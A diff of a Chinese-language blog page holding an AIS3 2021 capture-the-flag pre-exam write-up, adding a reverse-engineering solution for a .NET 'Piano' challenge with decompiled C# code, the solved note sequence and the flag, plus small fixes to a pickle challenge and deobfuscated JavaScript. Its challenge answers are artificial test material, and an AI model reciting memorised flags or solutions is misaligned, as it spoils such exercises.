@@ -9,19 +9,20 @@
 
     
 
-    <meta name="author" content="x2w">
+    <meta name="author" content="x2w-sloth">
     <meta name="description" content="雖然只有解出每個領域的簡單題目
 還是厚著臉皮寫一下Writeup好了
 反正抽查也被抽中了Q_Q
  REVERSE    Piano    題目是一個.NET的exe檔。
-只要是.NET一律丟進dnSpy反編譯。
- 🐰Peekora🥒    題目是一個Python Pickle檔：flag_checker.pkl
-可以用 python -m pickle flag_checker.pkl 執行它
-並且如名字所示, 成功輸入flag就會print(&ldquo;Correct!&quot;)
-輸入錯誤的話會直接exit, 不讓你用pickle把它load完。
-只能乖乖做靜態分析了
-python -m pickletools -a flag_checker.pkl
-0: c GLOBAL &#39;__builtin__ input&#39; Push a global object (module.attr) on the stack. 19: ( MARK Push markobject onto the stack. 20: S STRING &#39;FLAG: &#39; Push a Python string object. 30: t TUPLE (MARK at 19) Build a tuple out of the topmost stack slice, after markobject.">
+有12個鍵給你按、讓你彈鋼琴。
+ 只要是.NET一律丟進dnSpy反編譯。
+先來看他的click handler，基本上就是讓你按下去時會放那個音階的.wav檔
+但是輸入第14個音後有點有趣，會跑一個isValid()
+如果過了isValid()就會跳出一個視窗，內容是nya()
+可以聯想到可能要按下14個特定的音
+// piano.Piano // Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390 private void onClickHandler(object sender, EventArgs e) { Button button = (Button)sender; this.notes.Add(this.buttons.IndexOf(button)); this.audio.SoundLocation = Path.Combine(this.rootLocation, &#34;..\\Resources\\&#34; &#43; button.Name &#43; &#34;.wav&#34;); this.audio.Play(); if (this.notes.Count == 14) { if (this.isValid()) { MessageBox.Show(this.nya()); } this.notes.RemoveAt(0); } } 先來看nya()
+內容多半就是Flag了
+回傳值是list裡面的每個int和我們按下的notes一直XOR到底">
     <meta name="keywords" content="">
 
     <meta name="twitter:card" content="summary"/>
@@ -30,28 +31,30 @@ python -m pickletools -a flag_checker.pkl
 還是厚著臉皮寫一下Writeup好了
 反正抽查也被抽中了Q_Q
  REVERSE    Piano    題目是一個.NET的exe檔。
-只要是.NET一律丟進dnSpy反編譯。
- 🐰Peekora🥒    題目是一個Python Pickle檔：flag_checker.pkl
-可以用 python -m pickle flag_checker.pkl 執行它
-並且如名字所示, 成功輸入flag就會print(&ldquo;Correct!&quot;)
-輸入錯誤的話會直接exit, 不讓你用pickle把它load完。
-只能乖乖做靜態分析了
-python -m pickletools -a flag_checker.pkl
-0: c GLOBAL &#39;__builtin__ input&#39; Push a global object (module.attr) on the stack. 19: ( MARK Push markobject onto the stack. 20: S STRING &#39;FLAG: &#39; Push a Python string object. 30: t TUPLE (MARK at 19) Build a tuple out of the topmost stack slice, after markobject."/>
+有12個鍵給你按、讓你彈鋼琴。
+ 只要是.NET一律丟進dnSpy反編譯。
+先來看他的click handler，基本上就是讓你按下去時會放那個音階的.wav檔
+但是輸入第14個音後有點有趣，會跑一個isValid()
+如果過了isValid()就會跳出一個視窗，內容是nya()
+可以聯想到可能要按下14個特定的音
+// piano.Piano // Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390 private void onClickHandler(object sender, EventArgs e) { Button button = (Button)sender; this.notes.Add(this.buttons.IndexOf(button)); this.audio.SoundLocation = Path.Combine(this.rootLocation, &#34;..\\Resources\\&#34; &#43; button.Name &#43; &#34;.wav&#34;); this.audio.Play(); if (this.notes.Count == 14) { if (this.isValid()) { MessageBox.Show(this.nya()); } this.notes.RemoveAt(0); } } 先來看nya()
+內容多半就是Flag了
+回傳值是list裡面的每個int和我們按下的notes一直XOR到底"/>
 
     <meta property="og:title" content="AIS3 2021 Pre-Exam Writeup" />
 <meta property="og:description" content="雖然只有解出每個領域的簡單題目
 還是厚著臉皮寫一下Writeup好了
 反正抽查也被抽中了Q_Q
  REVERSE    Piano    題目是一個.NET的exe檔。
-只要是.NET一律丟進dnSpy反編譯。
- 🐰Peekora🥒    題目是一個Python Pickle檔：flag_checker.pkl
-可以用 python -m pickle flag_checker.pkl 執行它
-並且如名字所示, 成功輸入flag就會print(&ldquo;Correct!&quot;)
-輸入錯誤的話會直接exit, 不讓你用pickle把它load完。
-只能乖乖做靜態分析了
-python -m pickletools -a flag_checker.pkl
-0: c GLOBAL &#39;__builtin__ input&#39; Push a global object (module.attr) on the stack. 19: ( MARK Push markobject onto the stack. 20: S STRING &#39;FLAG: &#39; Push a Python string object. 30: t TUPLE (MARK at 19) Build a tuple out of the topmost stack slice, after markobject." />
+有12個鍵給你按、讓你彈鋼琴。
+ 只要是.NET一律丟進dnSpy反編譯。
+先來看他的click handler，基本上就是讓你按下去時會放那個音階的.wav檔
+但是輸入第14個音後有點有趣，會跑一個isValid()
+如果過了isValid()就會跳出一個視窗，內容是nya()
+可以聯想到可能要按下14個特定的音
+// piano.Piano // Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390 private void onClickHandler(object sender, EventArgs e) { Button button = (Button)sender; this.notes.Add(this.buttons.IndexOf(button)); this.audio.SoundLocation = Path.Combine(this.rootLocation, &#34;..\\Resources\\&#34; &#43; button.Name &#43; &#34;.wav&#34;); this.audio.Play(); if (this.notes.Count == 14) { if (this.isValid()) { MessageBox.Show(this.nya()); } this.notes.RemoveAt(0); } } 先來看nya()
+內容多半就是Flag了
+回傳值是list裡面的每個int和我們按下的notes一直XOR到底" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/ais3_2021_pre_exam_writeup/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-05-25T17:23:15&#43;08:00" />
@@ -78,6 +81,12 @@ python -m pickletools -a flag_checker.pkl
     
 
     
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.f37febc669ce189201c1918fac1948a254686c8d366a312c2d72b2bb71ad97d1.css" integrity="sha256-83/rxmnOGJIBwZGPrBlIolRobI02ajEsLXKyu3Gtl9E=" crossorigin="anonymous" media="screen" />
+      
+    
 
     
 
@@ -96,7 +105,9 @@ python -m pickletools -a flag_checker.pkl
 
   
   
-  <body class="preload-transitions colorscheme-light"
+    
+  
+  <body class="preload-transitions colorscheme-auto"
         onload=""
   >
     
@@ -155,7 +166,7 @@ python -m pickletools -a flag_checker.pkl
             </span>
             <span class="reading-time">
               <i class="fa fa-clock-o" aria-hidden="true"></i>
-              閱讀時間 10 分鐘
+              閱讀時間 12 分鐘
             </span>
           </div>
           
@@ -192,7 +203,84 @@ python -m pickletools -a flag_checker.pkl
   </a>
 </h2>
 <p>題目是一個.NET的exe檔。</p>
+<p>有12個鍵給你按、讓你彈鋼琴。</p>
+<figure><img src="/img/ais3_2021/pre_exam/piano01.png"/>
+</figure>
+
 <p>只要是.NET一律丟進dnSpy反編譯。</p>
+<p>先來看他的click handler，基本上就是讓你按下去時會放那個音階的.wav檔</p>
+<p>但是輸入第14個音後有點有趣，會跑一個<code>isValid()</code></p>
+<p>如果過了<code>isValid()</code>就會跳出一個視窗，內容是<code>nya()</code></p>
+<p>可以聯想到可能要按下14個特定的音</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#75715e">// piano.Piano
+</span><span style="color:#75715e">// Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> onClickHandler(<span style="color:#66d9ef">object</span> sender, EventArgs e)
+{
+  Button button = (Button)sender;
+  <span style="color:#66d9ef">this</span>.notes.Add(<span style="color:#66d9ef">this</span>.buttons.IndexOf(button));
+  <span style="color:#66d9ef">this</span>.audio.SoundLocation = Path.Combine(<span style="color:#66d9ef">this</span>.rootLocation, <span style="color:#e6db74">&#34;..\\Resources\\&#34;</span> + button.Name + <span style="color:#e6db74">&#34;.wav&#34;</span>);
+  <span style="color:#66d9ef">this</span>.audio.Play();
+  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.notes.Count == <span style="color:#ae81ff">14</span>)
+  {
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.isValid())
+    {
+      MessageBox.Show(<span style="color:#66d9ef">this</span>.nya());
+    }
+    <span style="color:#66d9ef">this</span>.notes.RemoveAt(<span style="color:#ae81ff">0</span>);
+  }
+}
+</code></pre></div><p>先來看<code>nya()</code></p>
+<p>內容多半就是Flag了</p>
+<p>回傳值是list裡面的每個int和我們按下的notes一直XOR到底</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#75715e">// piano.Piano
+</span><span style="color:#75715e">// Token: 0x06000004 RID: 4 RVA: 0x0000236C File Offset: 0x0000056C
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">string</span> nya()
+{
+  List&lt;<span style="color:#66d9ef">int</span>&gt; list = <span style="color:#66d9ef">new</span> List&lt;<span style="color:#66d9ef">int</span>&gt; {
+    <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">104</span>,
+    <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">56</span>,
+    <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">48</span>,
+    <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">96</span>,
+    <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">122</span>
+  };
+  List&lt;<span style="color:#66d9ef">char</span>&gt; list2 = <span style="color:#66d9ef">new</span> List&lt;<span style="color:#66d9ef">char</span>&gt;();
+  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; list.Count; i++)
+  {
+    list2.Add((<span style="color:#66d9ef">char</span>)(list[i] ^ <span style="color:#66d9ef">this</span>.notes[i % <span style="color:#66d9ef">this</span>.notes.Count]));
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">string</span>(list2.ToArray());
+}
+</code></pre></div><p>但是因為解出來的字串和我們按下的notes直接相關，</p>
+<p>不能直接patch判斷valid地方，需要確定這14個音到底是什麼</p>
+<p>再來看一下<code>isValid()</code></p>
+<p>已經給出第<code>i</code>個音和第<code>(i+1) % 14</code>個音之間的關係</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#75715e">// piano.Piano
+</span><span style="color:#75715e">// Token: 0x06000003 RID: 3 RVA: 0x00002220 File Offset: 0x00000420
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">bool</span> isValid()
+{
+  List&lt;<span style="color:#66d9ef">int</span>&gt; list = <span style="color:#66d9ef">new</span> List&lt;<span style="color:#66d9ef">int</span>&gt; {
+    <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">14</span>
+  };
+  List&lt;<span style="color:#66d9ef">int</span>&gt; list2 = <span style="color:#66d9ef">new</span> List&lt;<span style="color:#66d9ef">int</span>&gt; {
+    <span style="color:#ae81ff">0</span>,  -<span style="color:#ae81ff">3</span>,  <span style="color:#ae81ff">0</span>, -<span style="color:#ae81ff">1</span>,  <span style="color:#ae81ff">0</span>,  <span style="color:#ae81ff">1</span>,  <span style="color:#ae81ff">1</span>,  <span style="color:#ae81ff">0</span>,  <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, -<span style="color:#ae81ff">5</span>,  <span style="color:#ae81ff">0</span>,  <span style="color:#ae81ff">1</span>,  <span style="color:#ae81ff">0</span>
+  };
+  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; <span style="color:#ae81ff">14</span>; i++)
+  {
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.notes[i] + <span style="color:#66d9ef">this</span>.notes[(i + <span style="color:#ae81ff">1</span>) % <span style="color:#ae81ff">14</span>] != list[i])
+    {
+      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.notes[i] - <span style="color:#66d9ef">this</span>.notes[(i + <span style="color:#ae81ff">1</span>) % <span style="color:#ae81ff">14</span>] != list2[i])
+    {
+      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+    }
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+}
+</code></pre></div><p>解完聯立後發現這14個音是</p>
+<p><code>C#, C#, G#, G#, A#, A#, G#, F#, F#, F, F, D#, D#, C#</code></p>
+<p>彈完小星星之後就跳出一個視窗給你Flag了</p>
+<p><code>AIS3{7wink1e_tw1nkl3_l1ttl3_574r_1n_C_5h4rp}</code></p>
 <hr>
 <h2 id="peekora">
   🐰Peekora🥒
@@ -200,8 +288,8 @@ python -m pickletools -a flag_checker.pkl
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
-<p>題目是一個Python Pickle檔：flag_checker.pkl</p>
-<p>可以用 python -m pickle flag_checker.pkl 執行它</p>
+<p>題目是一個Python Pickle檔：<code>flag_checker.pkl</code></p>
+<p>可以用 <code>python -m pickle flag_checker.pkl</code> 執行它</p>
 <p>並且如名字所示, 成功輸入flag就會print(&ldquo;Correct!&quot;)</p>
 <p>輸入錯誤的話會直接exit, 不讓你用pickle把它load完。</p>
 <p>只能乖乖做靜態分析了</p>
@@ -252,11 +340,11 @@ python -m pickletools -a flag_checker.pkl
 <li>flag[6] == &lsquo;A&rsquo;</li>
 <li>flag[9] == &lsquo;j&rsquo;</li>
 <li>flag[11] == &lsquo;p&rsquo;</li>
-<li>flag[14] == key[9]</li>
+<li>flag[14] == flag[9]</li>
 <li>flag[5] == &rsquo;d&rsquo;</li>
 <li>flag[10] == &lsquo;z&rsquo;</li>
 <li>flag[12] == &lsquo;h&rsquo;</li>
-<li>flag[13] == key[1]</li>
+<li>flag[13] == flag[1]</li>
 <li>flag[8] == &lsquo;w&rsquo;</li>
 <li>flag[7] == &rsquo;m'</li>
 </ul>
@@ -287,61 +375,58 @@ python -m pickletools -a flag_checker.pkl
 &lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c1 r0&#34;</span>&gt;t&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
 </code></pre></div><p>然後題目的Javascript有做obfuscation，所以真的有夠醜。</p>
 <p>經過一些簡化以及重新命名後，有關secret code的邏輯：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">TAG</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">cid</span>,<span style="color:#a6e22e">rid</span>,<span style="color:#a6e22e">chr</span>)=&gt;<span style="color:#e6db74">&#39;&lt;span&gt;&lt;div\x20class=\x22c&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">cid</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x20r&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rid</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x22&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">chr</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&lt;/span&gt;&#39;</span>
-      , <span style="color:#a6e22e">update</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">INPUT</span>=&gt;document[<span style="color:#e6db74">&#39;getElementById&#39;</span>](<span style="color:#a6e22e">f2</span>(<span style="color:#ae81ff">0x1cc</span>))[<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">dostuff</span>(<span style="color:#a6e22e">INPUT</span>);
-    document[<span style="color:#e6db74">&#39;addEventListener&#39;</span>](<span style="color:#e6db74">&#39;keydown&#39;</span>, <span style="color:#a6e22e">LISTENER</span>=&gt;{
-        <span style="color:#66d9ef">const</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x12b963</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2</span>;
-        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Backspace&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xa</span>)
-            <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>][<span style="color:#e6db74">&#39;substr&#39;</span>](<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span>);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">document[<span style="color:#e6db74">&#39;addEventListener&#39;</span>](<span style="color:#e6db74">&#39;keydown&#39;</span>, <span style="color:#a6e22e">LISTENER</span>=&gt;{
+    <span style="color:#66d9ef">const</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x12b963</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2</span>;
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Backspace&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xa</span>)
+        <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>][<span style="color:#e6db74">&#39;substr&#39;</span>](<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span>);
+    <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowUp&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1</span>))
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
         <span style="color:#66d9ef">else</span> {
-            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowUp&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1</span>))
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowDown&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x2</span>))
                 <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
             <span style="color:#66d9ef">else</span> {
-                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowDown&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x2</span>))
+                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowLeft&#39;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x6</span>))
                     <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
                 <span style="color:#66d9ef">else</span> {
-                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowLeft&#39;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x6</span>))
+                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowRight&#39;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x5</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7</span>))
                         <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
                     <span style="color:#66d9ef">else</span> {
-                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowRight&#39;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x5</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7</span>))
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8</span>)
                             <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
                         <span style="color:#66d9ef">else</span> {
-                            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8</span>)
-                                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
+                            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x9</span>)
+                                <span style="color:#66d9ef">return</span> document[<span style="color:#e6db74">&#39;getElementsByTagName&#39;</span>](<span style="color:#e6db74">&#39;body&#39;</span>)[<span style="color:#ae81ff">0x0</span>][<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">+=</span> <span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">b1</span>),
+                                <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span> <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#39;getElementById&#39;</span>](<span style="color:#e6db74">&#39;input&#39;</span>),
+                                <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#75715e">// unlock input
+</span><span style="color:#75715e"></span>                                document[<span style="color:#e6db74">&#39;getElementById&#39;</span>](<span style="color:#e6db74">&#39;output&#39;</span>)[<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">b2</span>)[<span style="color:#e6db74">&#39;match&#39;</span>](<span style="color:#e6db74">/(.{1,3})/g</span>)[<span style="color:#e6db74">&#39;map&#39;</span>](<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>=&gt;<span style="color:#a6e22e">TAG</span>(<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>[<span style="color:#ae81ff">0x0</span>], <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>[<span style="color:#ae81ff">0x1</span>], <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>[<span style="color:#ae81ff">0x2</span>]))[<span style="color:#e6db74">&#39;join&#39;</span>](<span style="color:#e6db74">&#39;&#39;</span>),
+                                <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
                             <span style="color:#66d9ef">else</span> {
-                                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x9</span>)
-                                    <span style="color:#66d9ef">return</span> document[<span style="color:#e6db74">&#39;getElementsByTagName&#39;</span>](<span style="color:#e6db74">&#39;body&#39;</span>)[<span style="color:#ae81ff">0x0</span>][<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">+=</span> <span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">b1</span>),
-                                    <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span> <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#39;getElementById&#39;</span>](<span style="color:#e6db74">&#39;input&#39;</span>),
